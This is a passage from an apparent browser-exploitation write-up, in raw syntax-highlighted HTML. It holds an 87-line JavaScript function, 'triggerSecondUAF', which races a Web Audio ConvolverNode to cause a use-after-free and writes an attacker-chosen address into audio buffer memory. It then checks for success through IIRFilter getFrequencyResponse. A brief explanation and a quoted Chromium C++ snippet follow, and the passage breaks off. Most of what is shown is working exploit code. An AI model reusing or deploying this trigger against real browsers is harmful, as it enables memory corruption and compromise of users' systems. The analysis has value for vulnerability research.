class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-78">78</div><div class="crayon-num" data-line="crayon-676241da675da276939257-79">79</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-80">80</div><div class="crayon-num" data-line="crayon-676241da675da276939257-81">81</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-82">82</div><div class="crayon-num" data-line="crayon-676241da675da276939257-83">83</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-84">84</div><div class="crayon-num" data-line="crayon-676241da675da276939257-85">85</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-86">86</div><div class="crayon-num" data-line="crayon-676241da675da276939257-87">87</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676241da675da276939257-1"><span class="crayon-e">let </span><span class="crayon-i">floatArray</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">Float32Array</span><span class="crayon-sy">(</span><span class="crayon-cn">10</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-2"><span class="crayon-e">let </span><span class="crayon-i">audioBufferArray1</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675da276939257-3"><span class="crayon-e">let </span><span class="crayon-i">audioBufferArray2</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-4"><span class="crayon-e">let </span><span class="crayon-i">imageDataArray</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675da276939257-5"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-6"><span class="crayon-e">async </span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">triggerSecondUAF</span><span class="crayon-sy">(</span><span class="crayon-i">addr</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">doneCb</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-676241da675da276939257-7"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">counter</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-8"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">numChannels</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675da276939257-9"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-10"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">audioCtx</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">OfflineAudioContext</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0x100000</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">48000</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675da276939257-11"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-12"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">bufferSource</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">audioCtx</span><span class="crayon-sy">.</span><span class="crayon-e">createBufferSource</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675da276939257-13"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">convolver</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">audioCtx</span><span class="crayon-sy">.</span><span class="crayon-e">createConvolver</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-14"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675da276939257-15"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">bigAudioBuffer</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">audioCtx</span><span class="crayon-sy">.</span><span class="crayon-e">createBuffer</span><span class="crayon-sy">(</span><span class="crayon-i">numChannels</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0x100</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">48000</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-16"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">smallAudioBuffer</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">audioCtx</span><span class="crayon-sy">.</span><span class="crayon-e">createBuffer</span><span class="crayon-sy">(</span><span class="crayon-i">numChannels</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0x2</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">48000</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675da276939257-17"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-18"><span class="crayon-h">	</span><span class="crayon-i">smallAudioBuffer</span><span class="crayon-sy">.</span><span class="crayon-e">getChannelData</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">fill</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675da276939257-19"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-20"><span class="crayon-h">	</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">let</span><span class="crayon-h"> </span><span class="crayon-i">i</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">i</span><span class="crayon-h"> </span><span class="crayon-h">&lt;</span><span class="crayon-h"> </span><span class="crayon-i">numChannels</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">i</span>++<span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-676241da675da276939257-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-e">let </span><span class="crayon-i">channelDataArray</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">BigUint64Array</span><span class="crayon-sy">(</span><span class="crayon-i">bigAudioBuffer</span><span class="crayon-sy">.</span><span class="crayon-e">getChannelData</span><span class="crayon-sy">(</span><span class="crayon-i">i</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-i">buffer</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-i">channelDataArray</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">addr</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675da276939257-23"><span class="crayon-h">	</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-24"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675da276939257-25"><span class="crayon-h">	</span><span class="crayon-i">bufferSource</span><span class="crayon-sy">.</span><span class="crayon-i">buffer</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">bigAudioBuffer</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-26"><span class="crayon-h">	</span><span class="crayon-i">convolver</span><span class="crayon-sy">.</span><span class="crayon-i">buffer</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">smallAudioBuffer</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675da276939257-27"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-28"><span class="crayon-h">	</span><span class="crayon-i">bufferSource</span><span class="crayon-sy">.</span><span class="crayon-i">loop</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675da276939257-29"><span class="crayon-h">	</span><span class="crayon-i">bufferSource</span><span class="crayon-sy">.</span><span class="crayon-i">loopStart</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-30"><span class="crayon-h">	</span><span class="crayon-i">bufferSource</span><span class="crayon-sy">.</span><span class="crayon-i">loopEnd</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675da276939257-31"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-32"><span class="crayon-h">	</span><span class="crayon-i">bufferSource</span><span class="crayon-sy">.</span><span class="crayon-e">connect</span><span class="crayon-sy">(</span><span class="crayon-i">convolver</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675da276939257-33"><span class="crayon-h">	</span><span class="crayon-i">convolver</span><span class="crayon-sy">.</span><span class="crayon-e">connect</span><span class="crayon-sy">(</span><span class="crayon-i">audioCtx</span><span class="crayon-sy">.</span><span class="crayon-i">destination</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-34"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675da276939257-35"><span class="crayon-h">	</span><span class="crayon-i">bufferSource</span><span class="crayon-sy">.</span><span class="crayon-e">start</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-36"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675da276939257-37"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">finished</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-38"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675da276939257-39"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; 	</span><span class="crayon-i">audioCtx</span><span class="crayon-sy">.</span><span class="crayon-e">startRendering</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-st">then</span><span class="crayon-sy">(</span><span class="crayon-t">function</span><span class="crayon-sy">(</span><span class="crayon-i">buffer</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-40"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; 		</span><span class="crayon-i">buffer</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-t">null</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675da276939257-41"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-42"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">finished</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-676241da675da276939257-43"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-i">audioCtx</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-t">null</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-44"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675da276939257-45"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-e">setTimeout</span><span class="crayon-sy">(</span><span class="crayon-i">doneCb</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">200</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-46"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-st">return</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675da276939257-47"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-48"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-i">finished</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675da276939257-49"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-50"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-e">setTimeout</span><span class="crayon-sy">(</span><span class="crayon-t">function</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-676241da675da276939257-51"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 		</span><span class="crayon-e">triggerSecondUAF</span><span class="crayon-sy">(</span><span class="crayon-i">addr</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">doneCb</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-52"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675da276939257-53"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-54"><span class="crayon-h">	</span><span class="crayon-sy">}</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675da276939257-55"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-56"><span class="crayon-h">	</span><span class="crayon-st">while</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">!</span><span class="crayon-i">finished</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-676241da675da276939257-57"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-i">counter</span>++<span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-58"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675da276939257-59"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-i">convolver</span><span class="crayon-sy">.</span><span class="crayon-i">buffer</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-t">null</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-60"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675da276939257-61"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-e">await </span><span class="crayon-e">later</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c">// wait 1 millisecond</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-62"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675da276939257-63"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">finished</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-64"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 		</span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675da276939257-65"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-66"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">let</span><span class="crayon-h"> </span><span class="crayon-i">i</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">i</span><span class="crayon-h"> </span><span class="crayon-h">&lt;</span><span class="crayon-h"> </span><span class="crayon-i">iirFilters</span><span class="crayon-sy">.</span><span class="crayon-i">length</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">i</span>++<span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-676241da675da276939257-67"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-i">floatArray</span><span class="crayon-sy">.</span><span class="crayon-e">fill</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-68"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	&nbsp;&nbsp; </span><span class="crayon-i">iirFilters</span><span class="crayon-sy">[</span><span class="crayon-i">i</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-e">getFrequencyResponse</span><span class="crayon-sy">(</span><span class="crayon-i">floatArray</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">floatArray</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">floatArray</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675da276939257-69"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-70"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 		</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">floatArray</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">!</span>=<span class="crayon-h"> </span><span class="crayon-cn">3.1415927410125732</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-676241da675da276939257-71"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 			</span><span class="crayon-i">finished</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-72"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675da276939257-73"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 	&nbsp;&nbsp;&nbsp;&nbsp; 		</span><span class="crayon-i">audioBufferArray2</span><span class="crayon-sy">.</span><span class="crayon-e">push</span><span class="crayon-sy">(</span><span class="crayon-i">audioCtx</span><span class="crayon-sy">.</span><span class="crayon-e">createBuffer</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">10000</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-74"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 		</span><span class="crayon-i">audioBufferArray2</span><span class="crayon-sy">.</span><span class="crayon-e">push</span><span class="crayon-sy">(</span><span class="crayon-i">audioCtx</span><span class="crayon-sy">.</span><span class="crayon-e">createBuffer</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">10000</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675da276939257-75"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-76"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;			</span><span class="crayon-i">bufferSource</span><span class="crayon-sy">.</span><span class="crayon-e">disconnect</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675da276939257-77"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;			</span><span class="crayon-i">convolver</span><span class="crayon-sy">.</span><span class="crayon-e">disconnect</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-78"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675da276939257-79"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;			</span><span class="crayon-st">return</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-80"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-676241da675da276939257-81"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-82"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675da276939257-83"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-i">convolver</span><span class="crayon-sy">.</span><span class="crayon-i">buffer</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">smallAudioBuffer</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-84"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675da276939257-85"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-e">await </span><span class="crayon-e">later</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c">// wait 1 millisecond</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675da276939257-86"><span class="crayon-h">	</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-676241da675da276939257-87"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
This time the exploit uses the function <em>getFrequencyResponse()</em> to check if exploitation was successful. The function creates an array of frequencies that is filled with a Nyquist filter and the source array for the operation is filled with zeroes.</p>
		<div id="crayon-676241da675dc586809087" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
void IIRDSPKernel::GetFrequencyResponse(int n_frequencies,
                                    	const float* frequency_hz,
                                    	float* mag_response,
                                    	float* phase_response) {
...
  Vector&lt;float&gt; frequency(n_frequencies);
  double nyquist = this-&gt;Nyquist();
  // Convert from frequency in Hz to normalized frequency (0 -&gt; 1),
  // with 1 equal to the Nyquist frequency.
  for (int k = 0; k &lt; n_frequencies; ++k)
	frequency[k] = frequency_hz[k] / nyquist;
...</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676241da675dc586809087-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675dc586809087-2">2</div><div class="crayon-num" data-line="crayon-676241da675dc586809087-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675dc586809087-4">4</div><div class="crayon-num" data-line="crayon-676241da675dc586809087-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675dc586809087-6">6</div><div class="crayon-num" data-line="crayon-676241da675dc586809087-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675dc586809087-8">8</div><div class="crayon-num" data-line="crayon-676241da675dc586809087-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675dc586809087-10">10</div><div class="crayon-num" data-line="crayon-676241da675dc586809087-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675dc586809087-12">12</div></div>
				</td>
